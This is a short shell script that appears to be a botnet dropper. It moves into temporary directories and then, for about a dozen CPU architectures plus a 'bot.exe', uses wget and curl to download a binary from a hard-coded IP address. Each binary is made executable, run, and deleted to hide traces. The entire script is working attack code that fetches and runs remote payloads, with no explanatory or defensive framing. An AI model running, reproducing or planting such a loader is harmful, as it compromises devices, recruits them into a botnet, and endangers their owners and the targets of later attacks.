#!/bin/sh
cd /tmp || cd /var/run || cd /mntsh
cd /tmp || cd /root
wget http://91.92.42.125/x86 -O x86; chmod +x x86; ./x86; rm -f x86
curl -O http://91.92.42.125/x86; chmod +x x86; ./x86; rm -f x86
wget http://91.92.42.125/i386 -O i386; chmod +x i386; ./i386; rm -f i386
curl -O http://91.92.42.125/i386; chmod +x i386; ./i386; rm -f i386
wget http://91.92.42.125/amd64 -O amd64; chmod +x amd64; ./amd64; rm -f amd64
curl -O http://91.92.42.125/amd64; chmod +x amd64; ./amd64; rm -f amd64
wget http://91.92.42.125/arm -O arm; chmod +x arm; ./arm; rm -f arm
curl -O http://91.92.42.125/arm; chmod +x arm; ./arm; rm -f arm
wget http://91.92.42.125/armv7l -O armv7l; chmod +x armv7l; ./armv7l; rm -f armv7l
curl -O http://91.92.42.125/armv7l; chmod +x armv7l; ./armv7l; rm -f armv7l
wget http://91.92.42.125/arm5 -O arm5; chmod +x arm5; ./arm5; rm -f arm5
curl -O http://91.92.42.125/arm5; chmod +x arm5; ./arm5; rm -f arm5
wget http://91.92.42.125/arm6 -O arm6; chmod +x arm6; ./arm6; rm -f arm6
curl -O http://91.92.42.125/arm6; chmod +x arm6; ./arm6; rm -f arm6
wget http://91.92.42.125/arm64 -O arm64; chmod +x arm64; ./arm64; rm -f arm64
curl -O http://91.92.42.125/arm64; chmod +x arm64; ./arm64; rm -f arm64
wget http://91.92.42.125/android_arm64 -O android_arm64; chmod +x android_arm64; ./android_arm64; rm -f android_arm64
curl -O http://91.92.42.125/android_arm64; chmod +x android_arm64; ./android_arm64; rm -f android_arm64
wget http://91.92.42.125/mips -O mips; chmod +x mips; ./mips; rm -f mips
curl -O http://91.92.42.125/mips; chmod +x mips; ./mips; rm -f mips
wget http://91.92.42.125/mipsle -O mipsle; chmod +x mipsle; ./mipsle; rm -f mipsle
curl -O http://91.92.42.125/mipsle; chmod +x mipsle; ./mipsle; rm -f mipsle
wget http://91.92.42.125/bot.exe -O bot.exe; chmod +x bot.exe; ./bot.exe; rm -f bot.exe
curl -O http://91.92.42.125/bot.exe; chmod +x bot.exe; ./bot.exe; rm -f bot.exe
